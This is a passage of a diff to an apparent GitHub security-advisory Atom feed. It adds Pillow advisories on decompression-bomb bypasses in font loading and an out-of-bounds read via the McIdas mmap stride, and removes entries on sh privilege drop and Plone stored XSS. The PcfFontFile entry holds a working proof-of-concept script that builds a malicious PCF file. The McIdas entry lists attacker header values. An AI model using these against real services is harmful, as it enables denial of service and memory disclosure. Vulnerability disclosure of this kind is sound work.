+<li><code>PcfFontFile.PcfFontFile(fp).to_imagefont()</code> → <code>FontFile.compile()</code></li>
+<li><code>PcfFontFile.PcfFontFile(fp).save(filename)</code> → <code>FontFile.compile()</code></li>
+</ul>
+<p>Neither <code>BdfFontFile</code> nor <code>PcfFontFile</code> is loaded via <code>Image.open()</code>, so the standard decompression bomb guard is <strong>entirely absent</strong> from the font loading code path. <code>compile()</code> is the only point where the combined allocation size is known, and it has no check.</p>
+<p>Confirmed unpatched on <code>python-pillow/Pillow</code> <code>main</code> branch as of 2026-06-08.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-5x94-69rx-g8h2">https://github.com/python-pillow/Pillow/security/advisories/GHSA-5x94-69rx-g8h2</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54060">https://nvd.nist.gov/vuln/detail/CVE-2026-54060</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d">https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2254.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2254.yaml</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst">https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst</a></li>
+<li><a href="https://github.com/advisories/GHSA-5x94-69rx-g8h2">https://github.com/advisories/GHSA-5x94-69rx-g8h2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5x94-69rx-g8h2</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-20T21:08:40.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pillow] Pillow `PcfFontFile._load_bitmaps()`: `Image.frombytes()` called without `_decompression_bomb_check()` — bomb protection bypass via PCF font loading]]></title>
+        <id>https://github.com/advisories/GHSA-8v84-f9pq-wr9x</id>
+        <link href="https://github.com/advisories/GHSA-8v84-f9pq-wr9x"/>
+        <updated>2026-07-20T21:08:28.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="description">Description</h2>
+<p><code>PIL/PcfFontFile.py</code> <code>_load_bitmaps()</code> (line 227) reads glyph dimensions from the PCF <code>METRICS</code> section and passes them directly to <code>Image.frombytes()</code> without calling <code>Image._decompression_bomb_check()</code>. Dimensions originate from unsigned 16-bit values:</p>
+<pre><code>xsize = right - left          (max: 65535 − 0 = 65535)
+ysize = ascent + descent      (max: 65535 + 65535 = 131070)
+</code></pre>
+<p>Maximum exploitable pixel count: <strong>65,535 × 131,070 = 8,589,734,450 pixels</strong> — <strong>48× the DecompressionBombError threshold</strong>.</p>
+<p><strong>Vulnerable code (<code>PIL/PcfFontFile.py</code> line 224–227):</strong></p>
+<pre><code class="language-python">for i in range(nbitmaps):
+    xsize, ysize = metrics[i][:2]    # from PCF METRICS — attacker-controlled
+    b, e = offsets[i : i + 2]
+    bitmaps.append(
+        Image.frombytes("1", (xsize, ysize), data[b:e], "raw", mode, pad(xsize))
+        # ↑ NO _decompression_bomb_check()!
+    )
+</code></pre>
+<p><code>Image.frombytes()</code> calls <code>Image.new()</code> first (allocating the full C-heap buffer), <strong>then</strong> attempts to fill it. This creates two distinct attack paths:</p>
+<ul>
+<li><strong>Persistent attack</strong>: Provide matching bitmap data → <code>frombytes()</code> succeeds → image stored in <code>font.glyph[ch]</code> permanently</li>
+<li><strong>Transient attack</strong>: Provide a 148-byte PCF file with large declared dimensions but no data → <code>Image.new()</code> allocates the full buffer → <code>ValueError</code> → buffer freed → but the spike occurs before Python can respond</li>
+</ul>
+<h2 id="steps-to-reproduce">Steps to reproduce</h2>
+<p><strong>Proof of Concept script:</strong></p>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""PoC: PcfFontFile bomb bypass — 148-byte PCF → 23 MB allocation"""
+import io, struct, tracemalloc, warnings
+warnings.filterwarnings("ignore")
+
+from PIL.PcfFontFile import PcfFontFile
+from PIL.Image import _decompression_bomb_check, DecompressionBombWarning, DecompressionBombError
+
+W, H = 14000, 14000   # 196M pixels → above DecompressionBombError threshold
+
+# Show what Image.open() would do
+warnings.filterwarnings("error", category=DecompressionBombWarning)
+try:
+    _decompression_bomb_check((W, H))
+except (DecompressionBombWarning, DecompressionBombError) as e:
+    print(f"[Image.open() path] BLOCKED by {type(e).__name__}")
+warnings.filterwarnings("ignore")
+
+# PCF binary constants
+PCF_MAGIC    = 0x70636601
+PCF_PROPS    = 1 &lt;&lt; 0
+PCF_METRICS  = 1 &lt;&lt; 2
+PCF_BITMAPS  = 1 &lt;&lt; 3
+PCF_ENCODINGS= 1 &lt;&lt; 5
+
+def build_bomb_pcf(xsize, ysize):
+    # Properties: empty
+    props = struct.pack("&lt;III", 0, 0, 0)
+
+    # Metrics (jumbo, non-compressed): 1 glyph — xsize=right-left, ysize=ascent+descent
+    metrics = struct.pack("&lt;II", 0, 1)
+    metrics += struct.pack("&lt;HHHHHH", 0, xsize, xsize, ysize, 0, 0)
+
+    # Bitmaps: 1 glyph, empty data (transient attack)
+    bitmaps = struct.pack("&lt;II", 0, 1)
+    bitmaps += struct.pack("&lt;I", 0)              # offset[0] = 0
+    bitmaps += struct.pack("&lt;IIII", 0, 0, 0, 0) # bitmap_sizes all = 0
+
+    # Encodings: char 0x41 ('A') → glyph 0
+    enc_offsets = [0xFFFF]*65 + [0] + [0xFFFF]*62
+    encodings = struct.pack("&lt;IHHHHH", 0, 0, 127, 0, 0, 0xFFFF)
+    encodings += struct.pack("&lt;" + "H"*128, *enc_offsets)
+
+    secs = [(PCF_PROPS, props), (PCF_METRICS, metrics),
+            (PCF_BITMAPS, bitmaps), (PCF_ENCODINGS, encodings)]
+    hdr_size = 4 + 4 + len(secs) * 16
+    out = struct.pack("&lt;II", PCF_MAGIC, len(secs))
+    offset = hdr_size
+    for stype, sdata in secs:
+        out += struct.pack("&lt;IIII", stype, 0, len(sdata), offset)
+        offset += len(sdata)
+    for _, sdata in secs:
+        out += sdata
+    return out
+
+pcf = build_bomb_pcf(W, H)
+print(f"[*] PCF file size  : {len(pcf)} bytes")
+print(f"[*] Glyph size     : {W} x {H} = {W*H:,} pixels")
+print(f"[*] C-heap target  : {W*H//8//1024**2} MB  (mode '1' = 1 bit/pixel)")
+
+tracemalloc.start()
+try:
+    font = PcfFontFile(io.BytesIO(pcf))
+    _, peak = tracemalloc.get_traced_memory()
+    tracemalloc.stop()
+    print(f"[!] CONFIRMED (persistent): bomb check bypassed — heap peak {peak/1024**2:.2f} MB")
+except Exception as e:
+    _, peak = tracemalloc.get_traced_memory()
+    tracemalloc.stop()
+    print(f"[!] CONFIRMED (transient): {type(e).__name__} after allocation")
+    print(f"    Heap peak: {peak/1024**2:.2f} MB")
+    print(f"    C-heap allocation of ~{W*H//8//1024**2} MB occurred before exception")
+</code></pre>
+<p><strong>Expected output:</strong></p>
+<pre><code>[Image.open() path] BLOCKED by DecompressionBombError
+[*] PCF file size  : 148 bytes
+[*] Glyph size     : 14000 x 14000 = 196,000,000 pixels
+[*] C-heap target  : 23 MB  (mode '1' = 1 bit/pixel)
+[!] CONFIRMED (transient): ValueError after allocation
+    C-heap allocation of ~23 MB occurred before exception
+</code></pre>
+<p><strong>Amplification table:</strong></p>
+<table>
+<thead>
+<tr>
+<th>PCF file</th>
+<th>Glyph dims</th>
+<th>C-heap (mode '1')</th>
+<th>Bomb check</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>148 bytes</td>
+<td>14000 × 14000</td>
+<td>23 MB (transient)</td>
+<td>Bypassed</td>
+</tr>
+<tr>
+<td>148 bytes</td>
+<td>65535 × 131070</td>
+<td>1.07 GB (transient)</td>
+<td>Bypassed</td>
+</tr>
+<tr>
+<td>~512 MB</td>
+<td>65535 × 131070</td>
+<td>1.07 GB (persistent)</td>
+<td>Bypassed</td>
+</tr>
+</tbody></table>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Availability</strong>: HIGH — up to 1.07 GB per glyph, no limit per font file</li>
+<li><strong>Confidentiality</strong>: None</li>
+<li><strong>Integrity</strong>: None</li>
+<li>Any service loading PCF fonts from untrusted sources (e.g., <code>PcfFontFile(fp)</code>) is affected</li>
+<li><code>PcfFontFile</code> is never loaded via <code>Image.open()</code>, so the bomb check protection is completely absent from the entire PCF font loading path</li>
+<li>Confirmed unpatched on <code>python-pillow/Pillow</code> <code>main</code> branch as of 2026-06-07</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-8v84-f9pq-wr9x">https://github.com/python-pillow/Pillow/security/advisories/GHSA-8v84-f9pq-wr9x</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54059">https://nvd.nist.gov/vuln/detail/CVE-2026-54059</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d">https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2253.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2253.yaml</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst">https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst</a></li>
+<li><a href="https://github.com/advisories/GHSA-8v84-f9pq-wr9x">https://github.com/advisories/GHSA-8v84-f9pq-wr9x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8v84-f9pq-wr9x</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-20T21:08:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pillow] Pillow: Out-of-bounds read via attacker-controlled row stride on Pillow's mmap path (McIdas AREA files)]]></title>
+        <id>https://github.com/advisories/GHSA-62p4-gmf7-7g93</id>
+        <link href="https://github.com/advisories/GHSA-62p4-gmf7-7g93"/>
+        <updated>2026-07-20T21:08:14.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>When Pillow loads an uncompressed image whose tile uses the <code>raw</code> codec and a mode in <code>Image._MAPMODES</code>, and the image was opened <strong>from a filename</strong>, it memory-maps the file and builds the image's row pointers directly into the mapping via <code>PyImaging_MapBuffer</code> (<code>src/map.c</code>). The per-row spacing (<code>stride</code>) is taken from the tile arguments. <code>map.c</code> validates <code>offset + ysize*stride &lt;= buffer_len</code> but <strong>never checks that <code>stride</code> is at least the natural row width <code>xsize * pixelsize</code></strong>.</p>
+<p>The <strong>McIdas</strong> AREA plugin (<code>McIdasImagePlugin.py</code>) derives <code>stride</code>, <code>offset</code>, <code>xsize</code>, and <code>ysize</code> directly from attacker-controlled 32-bit header words with no validation. By supplying a <code>stride</code> far smaller than the row width, an attacker makes each row pointer read <code>xsize*pixelsize</code> bytes that run past the mapped region. Accessing the pixels (e.g. <code>Image.tobytes()</code>,
+<code>getpixel</code>, <code>convert</code>, <code>save</code>) then reads adjacent process memory (information disclosure) or faults (SIGBUS, denial of service).</p>
+<h2 id="complete-code-trace">Complete Code Trace</h2>
+<p><strong>Step 1: <code>McIdasImageFile._open</code></strong> - turns attacker header words into image size, file offset, and row stride with no validation.</p>
+<pre><code class="language-python"># src/PIL/McIdasImagePlugin.py:41-70
+s = self.fp.read(256)
+if not _accept(s) or len(s) != 256:        # _accept: prefix == b"\x00\x00\x00\x00\x00\x00\x00\x04"
+    raise SyntaxError(...)
+self.area_descriptor = w = [0, *struct.unpack("!64i", s)]   # w[1..64] = signed BE int32, ALL attacker-controlled
+
+if w[11] == 1:
+    mode = rawmode = "L"                    # pixelsize 1, in _MAPMODES
+elif w[11] == 2:
+    mode = rawmode = "I;16B"                # pixelsize 2, in _MAPMODES
+...
+self._mode = mode
+self._size = w[10], w[9]                    # (xsize, ysize)  &lt;-- attacker
+offset = w[34] + w[15]                       # &lt;-- attacker
+stride = w[15] + w[10] * w[11] * w[14]       # &lt;-- attacker (set w[14]=0, w[15]=1 =&gt; stride=1)
+self.tile = [
+    ImageFile._Tile("raw", (0, 0) + self.size, offset, (rawmode, stride, 1))
+]
+</code></pre>
+<p><strong>Step 2: <code>ImageFile.load</code> (mmap branch)</strong> - selects mmap and delegates to <code>map_buffer</code>.</p>
+<pre><code class="language-python"># src/PIL/ImageFile.py:322-348
+if use_mmap:                                 # use_mmap = self.filename and len(self.tile) == 1
+    decoder_name, extents, offset, args = self.tile[0]
+    if (decoder_name == "raw" and isinstance(args, tuple) and len(args) &gt;= 3
+            and args[0] == self.mode and args[0] in Image._MAPMODES):
+        if offset &lt; 0:                       # only lower-bound guard on offset
+            raise ValueError("Tile offset cannot be negative")
+        with open(self.filename) as fp:
+            self.map = mmap.mmap(fp.fileno(), 0, access=mmap.ACCESS_READ)
+        if offset + self.size[1] * args[1] &gt; self.map.size():   # == offset + ysize*stride; NO stride&gt;=linesize check
+            raise OSError("buffer is not large enough")
+        self.im = Image.core.map_buffer(
+            self.map, self.size, decoder_name, offset, args      # args = ("L", stride, 1)
+        )
+</code></pre>
+<p><strong>Step 3: <code>PyImaging_MapBuffer</code></strong> - builds row pointers at <code>stride</code> spacing into the mmap; validates everything except <code>stride &gt;= row width</code>.</p>
+<pre><code class="language-c">/* src/map.c:65-140 */
+if (!PyArg_ParseTuple(args, "O(ii)sn(sii)",
+        &amp;target, &amp;xsize, &amp;ysize, &amp;codec, &amp;offset, &amp;mode_name, &amp;stride, &amp;ystep))
+    return NULL;
+...
+const ModeID mode = findModeID(mode_name);          /* "L" */
+
+if (stride &lt;= 0) {                                  /* attacker sets stride=1 (&gt;0) -&gt; NOT recomputed */
+    if (mode == IMAGING_MODE_L || mode == IMAGING_MODE_P) stride = xsize;
+    else if (isModeI16(mode)) stride = xsize * 2;
+    else stride = xsize * 4;
+}
+
+if (stride &gt; 0 &amp;&amp; ysize &gt; PY_SSIZE_T_MAX / stride) {/* overflow guard only */
+    PyErr_SetString(PyExc_MemoryError, "Integer overflow in ysize"); return NULL;
+}
+size = (Py_ssize_t)ysize * stride;                  /* = 1*1 = 1 */
+
+if (offset &gt; PY_SSIZE_T_MAX - size) { ... }
+...
+if (offset + size &gt; view.len) {                     /* 1 + 1 = 2 &lt;= 256 -&gt; PASSES */
+    PyErr_SetString(PyExc_ValueError, "buffer is not large enough");
+    PyBuffer_Release(&amp;view); return NULL;
+}
+
+im = ImagingNewPrologueSubtype(mode, xsize, ysize, sizeof(ImagingBufferInstance));
+/* im-&gt;linesize = xsize * pixelsize = 200000  (the REAL per-row read width) */
+
+/* setup file pointers -- NO check that stride &gt;= im-&gt;linesize */
+if (ystep &gt; 0) {
+    for (y = 0; y &lt; ysize; y++) {
+        im-&gt;image[y] = (char *)view.buf + offset + y * stride;   /* row points into mmap, spacing=1 */
+    }
+} else { ... }
+</code></pre>
+<p><code>im-&gt;linesize</code> (the number of bytes any consumer reads per row) is <code>xsize * pixelsize = 200000</code>, but the row pointers are only <code>stride = 1</code> byte apart and the buffer is only <code>offset + ysize*stride = 2</code> bytes "claimed". Nothing reconciles the two.</p>
+<p><strong>Step 4: pixel access (<code>Image.tobytes()</code> → raw encoder <code>copy1</code>)</strong> - reads <code>linesize</code> bytes from <code>im-&gt;image[0]</code>, i.e. <code>xsize</code> bytes starting at <code>view.buf + offset</code>, running far past the mmap.</p>
+<pre><code class="language-c">/* the raw "L" packer copies linesize (=xsize) bytes per row from im-&gt;image[y];
+   for row 0 that is view.buf+1 .. view.buf+1+200000, vs a 256-byte file. */
+</code></pre>
+<h2 id="chain-summary">Chain Summary</h2>
+<pre><code>SOURCE: McIdas AREA header words w[9],w[10],w[11],w[14],w[15],w[34]  (Image.open on a path)
+  ↓ McIdasImagePlugin._open: stride = w[15]+w[10]*w[11]*w[14]  -&gt; attacker sets stride=1   [McIdasImagePlugin.py:66]
+  ↓ tile = ("raw", (0,0,xsize,1), offset, ("L", 1, 1))                                     [McIdasImagePlugin.py:68]
+GADGET: ImageFile.load mmap branch -- only checks offset+ysize*stride&lt;=len  &lt;- BUG: no stride&gt;=linesize check  [ImageFile.py:343]
+  ↓ core.map_buffer(map, (xsize,1), "raw", offset, ("L",1,1))                              [ImageFile.py:346]
+SINK: PyImaging_MapBuffer: im-&gt;image[0] = view.buf + offset + 0*stride; linesize=xsize   [map.c:134]
+  ↓ Image.tobytes() raw "L" encoder reads linesize (=xsize) bytes from im-&gt;image[0]
+IMPACT: reads xsize bytes from a tiny mmap -&gt; OOB read of adjacent process memory (leak) or SIGBUS (DoS)
+</code></pre>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>See attached <a href="https://github.com/user-attachments/files/28460498/poc.zip">poc.zip</a></p>
+<h2 id="impact-on-a-parent-application">Impact on a Parent Application</h2>
+<p>Any application that opens image files supplied by users <strong>from a path on disk</strong> (the common pattern: save upload to a temp file, then <code>Image.open(path)</code>), has the default plugin set (McIdas is registered by default), and subsequently reads/returns/re-encodes the decoded pixels (thumbnailing, format conversion, serving a preview), is exposed:</p>
+<ul>
+<li><strong>Information disclosure (High):</strong> the decoded "image" contains bytes of the   worker process's adjacent heap/mapped memory, which the app then serves or stores - potentially leaking secrets, credentials, or other users' data.</li>
+<li><strong>Denial of service (High):</strong> a larger <code>xsize</code> reliably crashes the worker with SIGBUS.</li>
+</ul>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Core fix in <code>src/map.c</code> (<code>PyImaging_MapBuffer</code>): reject <code>offset &lt; 0</code> and <code>stride &lt; im-&gt;linesize</code>. Defense-in-depth in <code>McIdasImagePlugin._open</code>: reject <code>offset &lt; 0</code> or <code>stride &lt; xsize*pixelsize</code> .</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-62p4-gmf7-7g93">https://github.com/python-pillow/Pillow/security/advisories/GHSA-62p4-gmf7-7g93</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54058">https://nvd.nist.gov/vuln/detail/CVE-2026-54058</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/pull/9719">https://github.com/python-pillow/Pillow/pull/9719</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/commit/6a8de891fb00968e5ea79bfa84368ed90b3cfc1d">https://github.com/python-pillow/Pillow/commit/6a8de891fb00968e5ea79bfa84368ed90b3cfc1d</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/releases/tag/12.3.0">https://github.com/python-pillow/Pillow/releases/tag/12.3.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-62p4-gmf7-7g93">https://github.com/advisories/GHSA-62p4-gmf7-7g93</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-62p4-gmf7-7g93</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-20T21:08:13.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[vllm] vLLM denial of service via prompt embeds on M-RoPE models]]></title>
         <id>https://github.com/advisories/GHSA-33cg-gxv8-3p8g</id>
@@ -2211,196 +3145,5 @@ if __name__ == "__main__":
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-07-17T18:47:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[sh] sh _uid does not drop supplementary groups (incomplete privilege drop)]]></title>
-        <id>https://github.com/advisories/GHSA-q38v-wp89-2w55</id>
-        <link href="https://github.com/advisories/GHSA-q38v-wp89-2w55"/>
-        <updated>2026-07-17T18:41:40.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The <code>_uid</code> option performed an incomplete privilege drop on Linux/Unix-like systems.</p>
-<p>When <code>sh</code> was run from a process with elevated privileges, such as root, and a command was launched with <code>_uid=&lt;unprivileged user&gt;</code>, the child process changed its UID and primary GID but did not reset its supplementary groups. As a result, the child process could retain the parent process’s supplementary groups, potentially including privileged groups such as root, docker, disk, shadow, or sudo.</p>
-<p>This could allow a subprocess that was expected to run with reduced privileges to access files or resources available to the original process’s supplementary groups. Users are impacted if they rely on <code>_uid</code> as a privilege boundary when launching commands from a privileged parent process.</p>
-<h3 id="patches">Patches</h3>
-<p>Upgrade to version &gt;= 2.2.4</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Avoid using <code>_uid</code> when the user represents a less-privileged user.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/amoffat/sh/security/advisories/GHSA-q38v-wp89-2w55">https://github.com/amoffat/sh/security/advisories/GHSA-q38v-wp89-2w55</a></li>
-<li><a href="https://github.com/amoffat/sh/releases/tag/2.2.4">https://github.com/amoffat/sh/releases/tag/2.2.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-q38v-wp89-2w55">https://github.com/advisories/GHSA-q38v-wp89-2w55</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q38v-wp89-2w55</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-17T18:41:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[plone.restapi] plone.restapi: Stored XSS by spoofing mime type]]></title>
-        <id>https://github.com/advisories/GHSA-8rqh-vxpr-x77p</id>
-        <link href="https://github.com/advisories/GHSA-8rqh-vxpr-x77p"/>
-        <updated>2026-07-17T18:36:35.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A stored XSS affecting RichText fields. RichTextValue.output returns the raw, unsanitized stored value whenever the stored mimeType equals the outputMimeType. Because the safe-HTML output type (<code>text/x-html-safe</code>) is the type that signifies "already sanitized", any value whose stored mimeType equals it bypasses the safe_html transform entirely on render. The transform itself is sound — it correctly strips <code>on*</code> event-handler attributes and <code>javascript:/data:</code> URIs; the defect is that it is never invoked for these values. The unsanitized value is then emitted via <code>tal:content="structure ..."</code>, which performs no escaping, so the payload executes in the viewer's browser. </p>
-<p>This can be a problem when a RichText field is wrongly defined in code with a <code>mimeType</code> and <code>outputMimeType</code> that are the same, or when the REST API is used to the same effect.</p>
-<p>This is the same vulnerability as reported in <code>plone.app.textfield</code>:
-<a href="https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5">https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5</a></p>
-<h3 id="patches">Patches</h3>
-<p>The problem has been patched:</p>
-<ul>
-<li>For Plone 6.0 and 6.2, upgrade <code>plone.restapi</code> to 9.15.6.</li>
-<li>For Plone 6.2, upgrade <code>plone.restapi</code> to 10.0.1.</li>
-</ul>
-<p>This will prevent abusing the REST API to store wrong rich text values.</p>
-<p>This will <strong>not</strong> prevent XSS from rich text fields that already have wrong values.  For that, you will need a patched <code>plone.app.textfield</code> version. See the <code>plone.app.textfield</code> advisory linked above for versions.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>There is no known workaround.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5">https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5</a></li>
-<li><a href="https://github.com/plone/plone.restapi/security/advisories/GHSA-8rqh-vxpr-x77p">https://github.com/plone/plone.restapi/security/advisories/GHSA-8rqh-vxpr-x77p</a></li>
-<li><a href="https://github.com/advisories/GHSA-8rqh-vxpr-x77p">https://github.com/advisories/GHSA-8rqh-vxpr-x77p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8rqh-vxpr-x77p</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-17T18:36:34.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[plone.restapi] plone.restapi: Stored XSS by spoofing mime type]]></title>
-        <id>https://github.com/advisories/GHSA-8rqh-vxpr-x77p</id>
-        <link href="https://github.com/advisories/GHSA-8rqh-vxpr-x77p"/>
-        <updated>2026-07-17T18:36:35.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A stored XSS affecting RichText fields. RichTextValue.output returns the raw, unsanitized stored value whenever the stored mimeType equals the outputMimeType. Because the safe-HTML output type (<code>text/x-html-safe</code>) is the type that signifies "already sanitized", any value whose stored mimeType equals it bypasses the safe_html transform entirely on render. The transform itself is sound — it correctly strips <code>on*</code> event-handler attributes and <code>javascript:/data:</code> URIs; the defect is that it is never invoked for these values. The unsanitized value is then emitted via <code>tal:content="structure ..."</code>, which performs no escaping, so the payload executes in the viewer's browser. </p>
-<p>This can be a problem when a RichText field is wrongly defined in code with a <code>mimeType</code> and <code>outputMimeType</code> that are the same, or when the REST API is used to the same effect.</p>
-<p>This is the same vulnerability as reported in <code>plone.app.textfield</code>:
-<a href="https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5">https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5</a></p>
-<h3 id="patches">Patches</h3>
-<p>The problem has been patched:</p>
-<ul>
-<li>For Plone 6.0 and 6.2, upgrade <code>plone.restapi</code> to 9.15.6.</li>
-<li>For Plone 6.2, upgrade <code>plone.restapi</code> to 10.0.1.</li>
-</ul>
-<p>This will prevent abusing the REST API to store wrong rich text values.</p>
-<p>This will <strong>not</strong> prevent XSS from rich text fields that already have wrong values.  For that, you will need a patched <code>plone.app.textfield</code> version. See the <code>plone.app.textfield</code> advisory linked above for versions.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>There is no known workaround.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5">https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5</a></li>
-<li><a href="https://github.com/plone/plone.restapi/security/advisories/GHSA-8rqh-vxpr-x77p">https://github.com/plone/plone.restapi/security/advisories/GHSA-8rqh-vxpr-x77p</a></li>
-<li><a href="https://github.com/advisories/GHSA-8rqh-vxpr-x77p">https://github.com/advisories/GHSA-8rqh-vxpr-x77p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8rqh-vxpr-x77p</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-17T18:36:34.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[plone.app.textfield] plone.app.textfield: Stored XSS by spoofing mime type ]]></title>
-        <id>https://github.com/advisories/GHSA-4r4f-gg25-rmg5</id>
-        <link href="https://github.com/advisories/GHSA-4r4f-gg25-rmg5"/>
-        <updated>2026-07-17T18:36:00.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A stored XSS affecting RichText fields. RichTextValue.output returns the raw, unsanitized stored value whenever the stored mimeType equals the outputMimeType. Because the safe-HTML output type (<code>text/x-html-safe</code>) is the type that signifies "already sanitized", any value whose stored mimeType equals it bypasses the safe_html transform entirely on render. The transform itself is sound — it correctly strips <code>on*</code> event-handler attributes and <code>javascript:/data:</code> URIs; the defect is that it is never invoked for these values. The unsanitized value is then emitted via <code>tal:content="structure ..."</code>, which performs no escaping, so the payload executes in the viewer's browser. </p>
-<p>This can be a problem when a RichText field is wrongly defined in code with a <code>mimeType</code> and <code>outputMimeType</code> that are the same, or when the REST API is used to the same effect.</p>
-<h3 id="patches">Patches</h3>
-<p>The problem has been patched:</p>
-<ul>
-<li>For Plone 6.0, upgrade <code>plone.app.textfield</code> to 2.0.2.</li>
-<li>For Plone 6.1, upgrade <code>plone.app.textfield</code> to 3.0.2.</li>
-<li>For Plone 6.2, upgrade <code>plone.app.textfield</code> to 4.0.1.</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>There is no known workaround.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5">https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5</a></li>
-<li><a href="https://github.com/advisories/GHSA-4r4f-gg25-rmg5">https://github.com/advisories/GHSA-4r4f-gg25-rmg5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4r4f-gg25-rmg5</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-17T18:35:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[plone.app.textfield] plone.app.textfield: Stored XSS by spoofing mime type ]]></title>
-        <id>https://github.com/advisories/GHSA-4r4f-gg25-rmg5</id>
-        <link href="https://github.com/advisories/GHSA-4r4f-gg25-rmg5"/>
-        <updated>2026-07-17T18:36:00.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
